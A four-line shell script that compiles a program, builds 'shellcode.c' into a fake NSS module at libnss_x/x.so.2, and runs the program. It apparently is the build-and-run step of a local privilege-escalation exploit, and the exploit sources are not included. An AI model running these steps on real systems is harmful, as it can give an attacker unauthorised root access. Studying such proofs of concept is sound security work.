gcc -O3 main.c
mkdir -p libnss_x
gcc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
./a.out
